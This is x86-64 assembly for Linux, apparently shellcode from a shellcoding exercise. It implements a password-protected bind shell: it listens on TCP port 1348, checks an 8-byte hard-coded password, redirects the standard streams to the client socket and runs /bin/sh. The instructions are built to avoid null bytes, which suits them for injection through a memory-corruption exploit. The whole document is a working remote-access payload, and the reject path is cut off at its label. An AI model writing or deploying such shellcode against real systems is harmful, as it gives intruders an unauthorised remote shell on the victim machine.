BITS 64

global _start

section .text

_start:
    ; socket(int domain, int type, int protocol);
    mov al, 41      ; system call number
    mov dil, 2      ; domain = AF_INET (= 2)
    xor rsi,rsi
    mov sil, 1      ; type = SOCK_STREAM (= 1)
    xor rdx,rdx     ; protocol = 0
    syscall
    mov rdi, rax    ; save return value to rdi
    xor rbx, rbx

    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    push rbx
    push qword 0x0000000044050102  ; push server on the stack at once
    dec byte [rsp+1]               ; otherwise we'd have a nullbyte since 0002 is 16bit short
    ;mov qword [rsp-8], rbx        ; char sin_zero[8] = 0 (rbx not initialized)
    ;mov dword [rsp-12], ebx       ; sin_addr = INADDR_ANY
    ;mov word [rsp-14], 0x4405     ; short sin_port = htons(1348)
	;mov word [rsp-16], 2          ; short sin_family = AF_INET (= 2)
    ;sub rsp, 16
	mov rsi, rsp
	mov dl, 16
    mov al, 49     ; system call number
	syscall

    ; listen(sock, MAX_CLIENTS)
    mov al, 50     ; system call number
	mov sil, 2
	syscall

    ; client = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    mov al, 43     ; system call number
    push rbx       ; reserve space for struct sockaddr
    push rbx
    mov rsi, rsp    ; pass address of this space as function parameter
    push byte 16    ; sockaddr_len is pushed on the stack
    mov rdx, rsp    ; pass as function parameter
    syscall

    mov r9, rax     ; save client socket descriptor to r9
    xor rax, rax

    ; close(sock)
    mov al, 3
    syscall


    ; read(client, pw_attempt, 8);
    xor al, al
    push rax        ; reserve 8bytes space on the stack
    mov rdi, r9
    mov rsi, rsp    ; password buffer space (the password entered)
    xor rdx, rdx
    mov dl, 8      ; pw len = 8
    syscall

    ; compare password
    mov rcx, 0x64726f7773736170 ; password
    push rcx
    mov rdi, rsp
    cmpsq
    jne reject_client
    xor rsi, rsi

    ; dup2(client, 0);
    mov rdi, r9
    mov al, 33
    syscall

    ; dup2(client, 1);
    mov al, 33
    inc esi
    syscall

    ; dup2(client, 2);
    mov al, 33
    inc esi
    syscall

    ; execve("/bin//sh",0, 0)
    mov al, 59
    push rbx             ; '\0'
    mov rcx, 0x68732f2f6e69622f ; /bin//sh
    push rcx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

reject_client: